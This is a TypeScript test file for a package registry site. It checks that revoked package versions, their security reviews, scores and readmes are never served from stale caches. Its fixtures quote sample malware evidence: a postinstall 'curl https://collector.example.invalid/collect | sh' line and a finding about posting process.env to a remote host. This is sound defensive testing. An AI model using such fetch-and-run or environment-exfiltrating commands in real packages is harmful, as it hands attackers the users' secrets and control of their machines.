// Revocation through the site's own reads, against a registry stub whose answers this file controls, down to holding
// one request until the test releases it. The site keeps no answer that carries a version's source (file text,
// excerpts, readmes, review quotes, score evidence) and no record of whether a version may be shown, so every view is
// the registry's answer to a request sent after the view began. Each test named "review finding N" turns one finding
// of the review of c926e6e into a check that failed on that commit.
import { afterAll, afterEach, beforeAll, describe, expect, mock, setSystemTime, spyOn, test } from "bun:test";
import { NextRequest } from "next/server";
import { fileStatus } from "./package-status";
import { fileApiPath, packageApiPath, REGISTRY } from "./registry-url";

// lib/registry.ts is the server entry point; outside Next its marker import would throw
void mock.module("server-only", () => ({}));

const { getFile, getPackage, getReview, getVersionScore } = await import("./registry");
const { GET: readmeRoute } = await import("../app/api/readme/route");
const { startPackageReads } = await import("./package-reads");
const { shownOf } = await import("./early-answer");

const T0 = Date.parse("2026-11-12T12:00:00Z");
const SOURCE = "collector.example.invalid";

type Answer = { status: number; body?: unknown };

type Held = { path: string; release: (a: Answer) => void };

/** The registry's answer per path; a small file when unset. */
const answers = new Map<string, Answer>();

/** Paths whose next request (any method) is held until the test releases it. */
const toHold = new Set<string>();

const held: Held[] = [];
const seen: { method: string; path: string }[] = [];
const realFetch = globalThis.fetch;
const FILE = { name: "x", version: "1.0.0", path: "index.js", size: 5, kind: "text", text: `see ${SOURCE}` };

function respond(a: Answer, method: string): Response {
  return new Response(method === "HEAD" ? null : JSON.stringify(a.body ?? { error: `answered ${a.status}` }), { status: a.status, headers: { "content-type": "application/json" } });
}

beforeAll(() => {
  const stub = (input: Parameters<typeof fetch>[0], init?: Parameters<typeof fetch>[1]): Promise<Response> => {
    const url = input instanceof Request ? input.url : input.toString();

    if (!url.startsWith(REGISTRY)) return realFetch(input, init);
    const path = `/${url.slice(REGISTRY.length)}`;
    const method = (input instanceof Request ? input.method : init?.method) ?? "GET";
    seen.push({ method, path });

    if (toHold.delete(path)) return new Promise((resolve) => held.push({ path, release: (a) => resolve(respond(a, method)) }));

    return Promise.resolve(respond(answers.get(path) ?? { status: 200, body: FILE }, method));
  };

  spyOn(globalThis, "fetch").mockImplementation(Object.assign(stub, { preconnect: realFetch.preconnect }));
});

afterEach(() => {
  setSystemTime();
});

afterAll(() => {
  mock.restore();
});

/** The request held for `path`, once the code under test has sent it. */
async function heldRequest(path: string): Promise<Held> {
  for (let i = 0; i < 200; i++) {
    const at = held.findIndex((h) => h.path === path);

    if (at >= 0) return held.splice(at, 1)[0] ?? Promise.reject(new Error("unreachable"));
    await Bun.sleep(1);
  }

  throw new Error(`no request for ${path} was sent`);
}

function fileOf(name: string) {
  const target = { name, version: "1.0.0", path: "index.js" };
  const path = `/${fileApiPath(target)}`;

  return {
    target,
    path,
    view: () => getFile(target),
    answer: (status: number) => answers.set(path, { status, body: status === 200 ? FILE : undefined }),
    hold: () => toHold.add(path),
    asked: () => seen.filter((s) => s.path === path).length,
  };
}

const GONE = { kind: "unavailable", reason: { kind: "status", status: 410 } } as const;

// ---------- registry answers that carry source ----------
const reviewPath = (name: string) => `/-/apm/v1/review/${name}/1.0.0`;
const scorePath = (name: string) => `/-/apm/v1/score/${name}/1.0.0`;
const packagePath = (name: string) => `/${packageApiPath(name)}`;

/** A review answer. */
function reviewBody(name: string, redacted: boolean) {
  const finding = { file: "index.js", line: 2, quote: redacted ? "" : SOURCE, excerpt: redacted ? "" : `https.request({ host: '${SOURCE}' })`, issue: "Posts process.env to a remote host.", severity: "high" };

  return {
    name,
    version: "1.0.0",
    status: "reviewed",
    redacted,
    review: { state: "confirmed", model: "m", reviewedAt: "2026-11-12T00:00:00Z", coverage: { mode: "files", previousVersion: null, filesInScope: 1, filesRead: 1 }, read: ["index.js"], notRead: [], findings: [finding], decidedAt: null, note: null },
    viewer: "public",
    private: null,
    canRequest: false,
  };
}

/** A score; withheld, it lists the signal with no evidence, as the registry's allowlist sends it. */
function scoreBody(name: string, redacted: boolean) {
  const evidence = redacted ? [] : [`index.js:2: https.request({ host: '${SOURCE}' })`, `package.json scripts.payload (run by scripts.postinstall): curl https://${SOURCE}/collect | sh`];

  return {
    name,
    version: "1.0.0",
    score: 30,
    grade: "F",
    redacted,
    signals: [{ id: "network", label: "Network access", points: -20, evidence, confidence: "confirmed" }],
    dismissed: [],
  };
}

/** A package answer with a readme and a latest score, as the registry sends it. */
function packageBody(input: { name: string; readme: string; score: Omit<ReturnType<typeof scoreBody>, "redacted"> | null; readmeVersion: string | null }) {
  return {
    name: input.name,
    source: "local",
    description: "",
    readme: input.readme,
    readmeVersion: input.readmeVersion,
    distTags: { latest: "1.0.0" },
    maintainers: ["alice"],
    latest: "1.0.0",
    facts: null,
    score: input.score,
    versions: [{ version: "1.0.0", publishedAt: "2026-11-12T00:00:00Z", publishedBy: "alice", status: "active", statusReason: null, deprecated: null, score: null, grade: null }],
  };
}

const README = `# demo\n\nReports to ${SOURCE}.`;

/** What a registry from before the redaction sends: the same answers without `redacted` and `readmeVersion`. */
const legacy = {
  review: (name: string) => {
    const { redacted: _redacted, ...old } = reviewBody(name, false);

    return old;
  },
  score: (name: string) => {
    const { redacted: _redacted, ...old } = scoreBody(name, false);

    return old;
  },
  package: (name: string) => {
    const { readmeVersion: _readmeVersion, ...old } = packageBody({ name, readme: README, score: legacy.score(name), readmeVersion: null });

    return old;
  },
};

describe("a view and a revoke", () => {
  // review finding 4: a view after the revoke joined an older shared HEAD and served the cached file on its yes
  test("review finding 4: a view sent after the revoke is refused while an older request for the file is still out", async () => {
    const f = fileOf("race-shared-head");
    setSystemTime(T0);
    expect((await f.view()).kind).toBe("ok");

    // past the old 5 s permission window, so the old code asked the registry with a HEAD here
    setSystemTime(T0 + 6_000);
    f.hold();
    const before = f.view();
    const older = await heldRequest(f.path);

    f.answer(410);
    setSystemTime(T0 + 6_500);
    const after = f.view();

    // the older request was answered before the revoke reached the registry
    older.release({ status: 200, body: FILE });
    expect((await before).kind).toBe("ok");
    expect(await after).toEqual(GONE);
    expect(await f.view()).toEqual(GONE);
  });

  test("a GET sent before the revoke and answered after it does not make the file servable again", async () => {
    const f = fileOf("race-slow-get");
    f.hold();
    const old = f.view();
    const request = await heldRequest(f.path);

    f.answer(410);
    expect(await f.view()).toEqual(GONE);
    request.release({ status: 200, body: FILE });
    expect((await old).kind).toBe("ok");
    expect(await f.view()).toEqual(GONE);
  });

  test("a review and a score read right after the revoke are the registry's redacted answers", async () => {
    const name = "race-review-score";
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
    answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
    expect(JSON.stringify(await getReview(name, "1.0.0"))).toContain(SOURCE);
    expect(JSON.stringify(await getVersionScore(name, "1.0.0"))).toContain(SOURCE);

    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, true) });
    answers.set(scorePath(name), { status: 200, body: scoreBody(name, true) });
    const review = await getReview(name, "1.0.0");
    const score = await getVersionScore(name, "1.0.0");

    expect(JSON.stringify([review, score])).not.toContain(SOURCE);
    expect(review.kind === "ok" && review.value.review?.findings[0]?.line).toBe(2);
    expect(score.kind === "ok" && score.value.signals.map((s) => s.id)).toEqual(["network"]);
  });

  test("when the registry can't be read, no review, score or file is shown from before", async () => {
    const name = "race-outage";
    const f = fileOf(name);
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
    answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
    await Promise.all([getReview(name, "1.0.0"), getVersionScore(name, "1.0.0"), f.view()]);

    for (const path of [reviewPath(name), scorePath(name), f.path]) answers.set(path, { status: 503 });
    const down = await Promise.all([getReview(name, "1.0.0"), getVersionScore(name, "1.0.0"), f.view()]);

    expect(down.map((d) => d.kind)).toEqual(["unavailable", "unavailable", "unavailable"]);
    expect(JSON.stringify(down)).not.toContain(SOURCE);
  });
});

// The package page reads a version's review and score before its package answer (package-reads.ts). A revoke that
// commits between the two leaves early answers read while the version was active; the package answer then reports it
// withheld, and the page must not show them.
describe("a revoke between the page's early reads and its package answer", () => {
  /** A package answer listing 1.0.0 with `status` and an active latest 2.0.0. */
  function withVersion(name: string, status: string) {
    const base = packageBody({ name, readme: "", score: null, readmeVersion: null });
    const row = (version: string, s: string) => ({ version, publishedAt: "2026-11-12T00:00:00Z", publishedBy: "alice", status: s, statusReason: s === "active" ? null : "malware", deprecated: null, score: null, grade: null });

    return { ...base, latest: "2.0.0", distTags: { latest: "2.0.0" }, versions: [row("1.0.0", status), row("2.0.0", "active")] };
  }

  /** Waits until the code under test has sent a request for each of `paths` (unheld ones are answered as sent). */
  async function sent(paths: readonly string[]): Promise<void> {
    for (let i = 0; i < 200 && !paths.every((p) => seen.some((s) => s.path === p)); i++) await Bun.sleep(1);

    expect(paths.filter((p) => !seen.some((s) => s.path === p))).toEqual([]);
  }

  for (const status of ["revoked", "revoke-pending"] as const) {
    test(`?v= of a version that went ${status}: the early review and score are read again, and the answers shown are redacted`, async () => {
      const name = `early-${status}`;
      answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
      answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
      toHold.add(packagePath(name));

      const reads = startPackageReads({ name, asked: "1.0.0" });
      const pkg = await heldRequest(packagePath(name));
      // the early reads were answered while 1.0.0 was active
      await sent([reviewPath(name), scorePath(name)]);
      await Bun.sleep(5);

      // the revoke commits, then the package answer reads the versions
      answers.set(reviewPath(name), { status: 200, body: reviewBody(name, true) });
      answers.set(scorePath(name), { status: 200, body: scoreBody(name, true) });
      pkg.release({ status: 200, body: withVersion(name, status) });
      const found = await reads.package;

      if (found.kind !== "ok") throw new Error(`package answer: ${found.kind}`);
      const shown = shownOf(found.value.versions, "1.0.0");

      expect(shown).toEqual({ version: "1.0.0", status: "withheld" });
      const [review, score] = await Promise.all([reads.review(shown), reads.score(shown)]);

      expect(review.kind === "ok" && review.value.redacted).toBe(true);
      expect(score.kind === "ok" && score.value.redacted).toBe(true);
      expect(JSON.stringify([review, score])).not.toContain(SOURCE);
      // each was asked twice: the early read and the read for the withheld version
      expect(seen.filter((s) => s.path === reviewPath(name)).length).toBe(2);
      expect(seen.filter((s) => s.path === scorePath(name)).length).toBe(2);
    });
  }

  test("a version still active when the package answer reads it: the early answers are used, with no second read", async () => {
    const name = "early-active";
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
    answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
    answers.set(packagePath(name), { status: 200, body: withVersion(name, "active") });

    const reads = startPackageReads({ name, asked: "1.0.0" });
    const found = await reads.package;

    if (found.kind !== "ok") throw new Error(`package answer: ${found.kind}`);
    const shown = shownOf(found.value.versions, "1.0.0");
    const [review, score] = await Promise.all([reads.review(shown), reads.score(shown)]);

    expect(review.kind === "ok" && !review.value.redacted).toBe(true);
    expect(score.kind === "ok" && !score.value.redacted).toBe(true);
    expect(seen.filter((s) => s.path === reviewPath(name) || s.path === scorePath(name)).length).toBe(2);
  });
});

describe("a package's readme and evidence", () => {
  // review finding 3: a package with no score was never checked again, so its cached readme outlived the revoke
  test("review finding 3: a package with no score shows the registry's readme of the moment, not a cached one", async () => {
    const name = "pkg-no-score";
    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: README, score: null, readmeVersion: "1.0.0" }) });
    setSystemTime(T0);
    expect(JSON.stringify(await getPackage(name))).toContain(SOURCE);

    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: "", score: null, readmeVersion: null }) });
    setSystemTime(T0 + 6_000);
    const after = await getPackage(name);

    expect(after.kind).toBe("ok");
    expect(JSON.stringify(after)).not.toContain(SOURCE);
  });

  test("review finding 3: an outage shows neither the readme nor the evidence from before", async () => {
    const name = "pkg-outage";
    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: README, score: scoreBody(name, false), readmeVersion: "1.0.0" }) });
    setSystemTime(T0);
    expect(JSON.stringify(await getPackage(name))).toContain(SOURCE);

    answers.set(packagePath(name), { status: 503 });
    setSystemTime(T0 + 6_000);
    const down = await getPackage(name);

    expect(down).toEqual({ kind: "unavailable", reason: { kind: "status", status: 503 } });
  });

  test("review finding 3: /api/readme reads the registry every time and tells every cache not to keep it", async () => {
    const name = "pkg-api-readme";
    const ask = () => readmeRoute(new NextRequest(`https://apmjs.dev/api/readme?name=${name}`));
    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: README, score: null, readmeVersion: "1.0.0" }) });
    const first = await ask();

    expect(first.headers.get("cache-control")).toBe("private, no-store");
    expect(await first.text()).toContain(SOURCE);

    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: "", score: null, readmeVersion: null }) });
    const second = await ask();

    expect(second.headers.get("cache-control")).toBe("private, no-store");
    expect(await second.text()).toBe("");
    expect(seen.filter((s) => s.path === packagePath(name)).length).toBe(2);
  });
});

// review finding 5: a site deployed before its registry read the old registry's answers, which carry no `redacted`
// and no `readmeVersion`, as "not redacted" and showed their source even after the site had seen the version refused
describe("review finding 5: answers from a registry too old to redact", () => {
  test("a review, score or package answer without the redaction fields is refused, not shown", async () => {
    const name = "legacy-registry";
    const f = fileOf(name);
    f.answer(410);
    expect(await f.view()).toEqual(GONE);
    answers.set(reviewPath(name), { status: 200, body: legacy.review(name) });
    answers.set(scorePath(name), { status: 200, body: legacy.score(name) });
    answers.set(packagePath(name), { status: 200, body: legacy.package(name) });

    const answers_ = await Promise.all([getReview(name, "1.0.0"), getVersionScore(name, "1.0.0"), getPackage(name)]);

    expect(answers_.map((a) => a.kind)).toEqual(["unavailable", "unavailable", "unavailable"]);
    expect(JSON.stringify(answers_)).not.toContain(SOURCE);
  });
});

// ---------- a second cache layer ----------
// review finding 6: the Cache API layer (shared by every isolate in a data center) held an older yes that outranked
// this isolate's newer no. Bun has no Cache API, so a Map-backed one stands in, and its writes can be held back the way
// a write from another isolate lands late. Bun defines no `Cache` or `caches`, so nothing is shadowed.
class MapCache {
  readonly entries = new Map<string, { body: string; headers: [string, string][] }>();
  frozen = false;

  async match(req: Request): Promise<Response | undefined> {
    const e = this.entries.get(req.url);

    return e ? new Response(e.body, { headers: e.headers }) : undefined;
  }

  async put(req: Request, res: Response): Promise<void> {
    const body = await res.text();

    if (!this.frozen) this.entries.set(req.url, { body, headers: [...res.headers] });
  }

  async delete(req: Request): Promise<boolean> {
    return this.frozen ? false : this.entries.delete(req.url);
  }
}

describe("review finding 6: a second cache layer", () => {
  const shared = new MapCache();

  beforeAll(() => {
    Reflect.set(globalThis, "Cache", MapCache);
    Reflect.set(globalThis, "caches", { default: shared });
  });

  // Bun has neither (checked above the class), so the test leaves none behind
  afterAll(() => {
    Reflect.deleteProperty(globalThis, "Cache");
    Reflect.deleteProperty(globalThis, "caches");
  });

  test("an older yes in the shared layer can't outrank a newer refusal: the view after the refusal is refused", async () => {
    const name = "layers-allow-deny";
    const f = fileOf(name);
    setSystemTime(T0);
    expect((await f.view()).kind).toBe("ok");
    await Bun.sleep(10);

    // the revoke; this isolate hears it from the review, and its shared write of the refusal has not landed
    shared.frozen = true;
    f.answer(410);
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, true) });
    setSystemTime(T0 + 1_000);
    expect((await getReview(name, "1.0.0")).kind).toBe("ok");

    setSystemTime(T0 + 2_000);
    expect(await f.view()).toEqual(GONE);
    expect(await fileStatus(f.target)).toBe("refused");
    shared.frozen = false;
  });

  test("nothing that carries source is written to the shared layer", async () => {
    const name = "layers-nothing-kept";
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
    answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: README, score: scoreBody(name, false), readmeVersion: "1.0.0" }) });
    await Promise.all([getReview(name, "1.0.0"), getVersionScore(name, "1.0.0"), getPackage(name), fileOf(name).view()]);
    await Bun.sleep(10);

    expect([...shared.entries.values()].map((e) => e.body).join("\n")).not.toContain(SOURCE);
  });
});
